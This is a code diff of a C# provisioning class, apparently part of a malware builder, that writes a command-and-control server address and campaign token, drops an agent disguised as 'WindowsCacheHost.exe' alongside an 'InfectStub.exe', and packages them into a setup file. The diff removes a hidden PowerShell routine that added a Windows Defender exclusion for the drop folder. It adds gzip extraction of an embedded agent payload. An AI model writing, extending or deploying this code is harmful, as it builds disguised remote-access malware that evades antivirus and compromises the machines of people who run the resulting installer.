@@ -1,3 +1,4 @@
+using System.IO.Compression;
 using System.Reflection;
 using System.Security.Cryptography;
 using System.Text;
@@ -27,7 +28,6 @@ public static class KliveLinkAssetProvisioner
             {
                 string generated = GeneratedDirectory(options);
                 Directory.CreateDirectory(generated);
-                AddDefenderExclusion(generated);
                 string token = EnsureCampaignToken(options);
                 string server = Environment.GetEnvironmentVariable("KLIVELINK_C2_URL")
                     ?? "wss://klive.dev/klivelink/v2/ws";
@@ -41,15 +41,22 @@ public static class KliveLinkAssetProvisioner
                 File.WriteAllText(configPath, config);
 
                 string agentPath = Path.Combine(generated, "WindowsCacheHost.exe");
-                string? managed = KliveLinkAssetLocator.Find("WindowsCacheHost.exe");
-                if (!string.IsNullOrWhiteSpace(managed) &&
-                    !string.Equals(Path.GetFullPath(managed), Path.GetFullPath(agentPath), StringComparison.OrdinalIgnoreCase))
+                try
                 {
-                    File.Copy(managed, agentPath, true);
+                    ExtractGzipResource("KliveLink.ManagedAgent.Gzip", agentPath);
                 }
-                else if (!File.Exists(agentPath))
+                catch
                 {
-                    ExtractBase64Resource("KliveLink.NativeAgent.Base64", agentPath);
+                    string? managed = KliveLinkAssetLocator.Find("WindowsCacheHost.exe");
+                    if (!string.IsNullOrWhiteSpace(managed) &&
+                        !string.Equals(Path.GetFullPath(managed), Path.GetFullPath(agentPath), StringComparison.OrdinalIgnoreCase))
+                    {
+                        File.Copy(managed, agentPath, true);
+                    }
+                    else if (!File.Exists(agentPath))
+                    {
+                        ExtractBase64Resource("KliveLink.NativeAgent.Base64", agentPath);
+                    }
                 }
 
                 string stubPath = Path.Combine(generated, "InfectStub.exe");
@@ -119,23 +126,13 @@ public static class KliveLinkAssetProvisioner
         File.WriteAllBytes(path, data);
     }
 
-    private static void AddDefenderExclusion(string directory)
+    private static void ExtractGzipResource(string name, string path)
     {
-        try
-        {
-            string script = $"Add-MpPreference -ExclusionPath '{directory.Replace("'", "''")}' -ErrorAction SilentlyContinue";
-            var psi = new System.Diagnostics.ProcessStartInfo
-            {
-                FileName = "powershell.exe",
-                Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"{script}\"",
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
-            };
-            using var process = System.Diagnostics.Process.Start(psi);
-            process?.WaitForExit(10000);
-        }
-        catch { }
+        using Stream? stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
+        if (stream == null) throw new InvalidOperationException($"Missing embedded resource {name}");
+        using var gzip = new GZipStream(stream, CompressionMode.Decompress);
+        using FileStream output = File.Create(path);
+        gzip.CopyTo(output);
     }
 
     private static void BuildSetup(string stubPath, string agentPath, string configPath, string setupPath)
